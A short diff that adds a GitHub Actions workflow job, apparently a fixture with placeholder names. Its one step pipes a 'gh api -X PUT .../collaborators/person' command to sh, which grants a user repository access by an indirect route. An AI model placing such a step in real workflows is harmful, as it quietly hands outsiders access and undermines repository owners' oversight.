@@ -1,0 +1,6 @@
+jobs:
+  decide:
+    steps:
+      - run: |
+          printf '%s\n' 'gh api -X PUT repos/o/r/collaborators/person' |
+            sh
